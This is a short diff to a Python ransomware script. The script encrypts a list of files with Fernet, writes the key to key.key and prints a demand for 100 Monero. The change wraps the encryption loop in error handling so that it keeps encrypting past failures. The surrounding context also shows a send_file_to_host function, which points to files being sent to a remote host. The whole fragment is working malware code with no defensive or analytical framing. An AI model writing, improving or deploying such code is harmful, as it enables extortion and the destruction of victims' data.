@@ -23,11 +23,15 @@ with open("key.key", "wb") as key_file:
     key_file.write(key)
 
 for file in files:
-    with open(file, "rb") as f:
-        data = f.read()
-    data_encrypted = Fernet(key).encrypt(data)
-    with open(file, "wb") as f:
-        f.write(data_encrypted)
+    try:
+        with open(file, "rb") as f:
+            data = f.read()
+        data_encrypted = Fernet(key).encrypt(data)
+        with open(file, "wb") as f:
+            f.write(data_encrypted)
+    except Exception as e:
+        print(f"Error encrypting file {file}: {e}")
+
 print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")
 
 def send_file_to_host(file_path, host, port):
